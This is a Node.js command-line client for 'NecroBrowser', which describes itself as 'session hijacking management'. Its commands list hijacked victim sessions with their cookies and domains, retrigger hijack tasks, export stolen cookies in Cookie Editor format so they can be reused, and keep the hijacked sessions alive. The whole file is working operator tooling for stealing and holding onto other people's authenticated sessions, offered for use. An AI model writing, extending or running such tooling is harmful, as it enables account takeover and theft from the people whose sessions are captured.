#!/usr/bin/env node

const { program } = require('commander');
const c = require('chalk');

const DEFAULT_API = 'http://localhost:3000';

async function apiCall(method, path, apiBase) {
    const url = `${apiBase}${path}`;
    const opts = {
        method: method,
        headers: { 'Content-Type': 'application/json' }
    };
    try {
        const res = await fetch(url, opts);
        const data = await res.json();
        if (!res.ok) {
            console.error(c.red(`Error ${res.status}: ${data.error || JSON.stringify(data)}`));
            process.exit(1);
        }
        return data;
    } catch (err) {
        console.error(c.red(`Failed to connect to ${url}: ${err.message}`));
        process.exit(1);
    }
}

function getApiBase() {
    return program.opts().host || process.env.NECRO_API || DEFAULT_API;
}

program
    .name('necrocli')
    .description('NecroBrowser CLI - session hijacking management')
    .version('1.0.0')
    .option('--host <url>', 'NecroBrowser API URL (default: http://localhost:3000, or NECRO_API env)');

// stats command
program
    .command('stats')
    .description('Show cluster status, queue size, workers, and error rate')
    .action(async () => {
        const data = await apiCall('GET', '/', getApiBase());
        console.log(c.red('\n--- NecroBrowser Stats ---\n'));
        console.log(`  Started:  ${data.startedAt || 'N/A'}`);
        console.log(`  Workers:  ${data.workers || '0'}`);
        console.log(`  Queued:   ${data.queued || '0'}`);
        console.log(`  Progress: ${data.progress || 'N/A'}`);
        console.log(`  Errors:   ${data.errors || '0'}`);
        if (data.tasks && data.tasks.length > 0) {
            console.log(c.cyan('\n  Active tasks:'));
            data.tasks.forEach(t => console.log(`    ${t}`));
        }
        console.log('');
    });

// sessions command
program
    .command('sessions')
    .description('List all hijacked sessions with cookie counts and domains')
    .action(async () => {
        const data = await apiCall('GET', '/sessions', getApiBase());
        const sessions = data.sessions || [];

        console.log(c.red(`\n--- Hijacked Sessions (${data.total || 0}) ---\n`));

        if (sessions.length === 0) {
            console.log('  No sessions found.\n');
            return;
        }

        // Group by status
        const byStatus = {};
        sessions.forEach(s => {
            const st = s.status || 'unknown';
            if (!byStatus[st]) byStatus[st] = [];
            byStatus[st].push(s);
        });

        for (const [status, list] of Object.entries(byStatus)) {
            const statusColor = status === 'completed' ? c.green
                              : status === 'running' ? c.cyan
                              : status === 'error' ? c.red
                              : c.yellow;
            console.log(statusColor(`  [${status.toUpperCase()}] (${list.length})`));

            list.forEach(s => {
                const kaIcon = s.keepalive === 'enabled' ? c.green('KA') : c.gray('--');
                const lastKa = s.lastKeepalive ? ` last:${s.lastKeepalive.substring(0, 19)}` : '';
                console.log(`    ${c.white(s.id)}`);
                console.log(`      type: ${s.type}.${s.taskName}  cookies: ${s.cookieCount}  ${kaIcon}${lastKa}`);
                if (s.domains.length > 0) {
                    console.log(`      domains: ${s.domains.join(', ')}`);
                }
                if (s.fixSession) {
                    console.log(`      fixSession: ${s.fixSession}`);
                }
            });
            console.log('');
        }
    });

// tasks command
program
    .command('tasks')
    .description('List available task types and methods')
    .action(async () => {
        const data = await apiCall('GET', '/tasks', getApiBase());
        console.log(c.red('\n--- Available Tasks ---\n'));
        for (const [type, methods] of Object.entries(data)) {
            console.log(`  ${c.white(type)}:`);
            if (Array.isArray(methods)) {
                methods.forEach(m => console.log(`    - ${m}`));
            }
        }
        console.log('');
    });

// retrigger command
program
    .command('retrigger <taskId>')
    .description('Retrigger a task by ID (creates new task with same cookies/params)')
    .action(async (taskId) => {
        console.log(c.cyan(`\nRetriggering ${taskId}...`));
        const data = await apiCall('POST', `/instrument/${taskId}/retrigger`, getApiBase());
        console.log(c.green(`  New task queued: ${data.necroId}`));
        console.log(`  Retriggered from: ${data.retriggeredFrom}`);
        console.log('');
    });

// status command
program
    .command('status <taskId>')
    .description('Get status and results for a specific task')
    .action(async (taskId) => {
        const data = await apiCall('GET', `/instrument/${taskId}`, getApiBase());
        console.log(c.red(`\n--- Task ${taskId} ---\n`));
        const statusColor = data.status === 'completed' ? c.green
                          : data.status === 'running' ? c.cyan
                          : data.status === 'error' ? c.red
                          : c.yellow;
        console.log(`  Status: ${statusColor(data.status)}`);
        if (data.data) {
            if (typeof data.data === 'string') {
                console.log(`  Info: ${data.data}`);
            } else if (Array.isArray(data.data)) {
                console.log(`  Results: ${data.data.length} entries`);
                data.data.forEach((entry, i) => {
                    if (entry.url) {
                        console.log(`    [${i}] ${entry.url}`);
                    }
                });
            }
        }
        console.log('');
    });

// cookies command
program
    .command('cookies <taskId>')
    .description('Export cookies for a session in Cookie Editor JSON format')
    .option('-o, --output <file>', 'Save cookies to a JSON file instead of stdout')
    .action(async (taskId, opts) => {
        const data = await apiCall('GET', `/instrument/${taskId}/cookies`, getApiBase());

        // Cookie Editor expects a plain JSON array
        const cookieArray = data.cookies || [];

        if (opts.output) {
            const fs = require('fs');
            fs.writeFileSync(opts.output, JSON.stringify(cookieArray, null, 2));
            console.log(c.green(`\n  Exported ${data.count} cookies to ${opts.output}\n`));
        } else {
            // Output raw JSON to stdout for piping
            console.log(JSON.stringify(cookieArray, null, 2));
        }
    });

// keepalive command group
const keepalive = program
    .command('keepalive')
    .description('Manage session keepalive');

keepalive
    .command('enable <taskId>')
    .description('Enable keepalive for a task')
    .action(async (taskId) => {
        const data = await apiCall('POST', `/instrument/${taskId}/keepalive/enable`, getApiBase());
        console.log(c.green(`\n  Keepalive enabled for ${data.taskId}\n`));
    });

keepalive
    .command('disable <taskId>')
    .description('Disable keepalive for a task')
    .action(async (taskId) => {
        const data = await apiCall('POST', `/instrument/${taskId}/keepalive/disable`, getApiBase());
        console.log(c.yellow(`\n  Keepalive disabled for ${data.taskId}\n`));
    });

program.parse();
